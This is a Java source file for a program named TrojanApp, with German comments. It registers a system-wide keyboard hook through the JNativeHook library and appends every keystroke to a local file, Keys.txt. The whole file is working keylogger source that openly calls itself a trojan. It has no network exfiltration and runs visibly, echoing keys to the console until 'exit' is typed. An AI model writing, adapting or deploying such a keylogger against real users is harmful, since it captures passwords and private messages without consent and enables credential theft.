package app.desktop; 
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Scanner;

public class TrojanApp {
    private static boolean running = true; // Flag zur Steuerung des Programmablaufs

    public static void main(String[] args) {
        new Controller(); // Startet den KeyListener

        // Warten auf einen Befehl zum Beenden
        Scanner scanner = new Scanner(System.in);
        System.out.println("Geben Sie 'exit' ein, um die TrojanApp zu schließen.");
        while (running) {
            String command = scanner.nextLine();
            if ("exit".equalsIgnoreCase(command)) {
                System.out.println("TrojanApp wird geschlossen.");
                running = false; // Beende die App
                break; // Beende die Schleife
            }
        }
        scanner.close();
        // Stopp den Listener
        stopListener();
    }

    private static void stopListener() {
        try {
            GlobalScreen.unregisterNativeHook(); // Deaktiviert den Listener
        } catch (NativeHookException e) {
            e.printStackTrace(); // Optional: Fehlerbehandlung
        }
    }
}

class KeyListener implements NativeKeyListener {
    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        System.out.print(keyText);
        // Create File.txt and record any key pressed
        try (OutputStream os = Files.newOutputStream(Controller.file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND);
             PrintWriter writer = new PrintWriter(os)) {
            if (keyText.length() > 1) {
                writer.print("[" + keyText + "]");
            } else {
                writer.print(keyText);
            }
        } catch (IOException ex) {
            throw new RuntimeException(ex);
        }
    }
}

class Controller {
    public static final Path file = Paths.get("Keys.txt");

    Controller() {
        try {
            addListener();
        } catch (Exception e) {
            e.printStackTrace(); // Optional: Fehlerbehandlung
        }
    }

    private void addListener() throws NativeHookException {
        // Activate the library
        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(new KeyListener());
    }
}
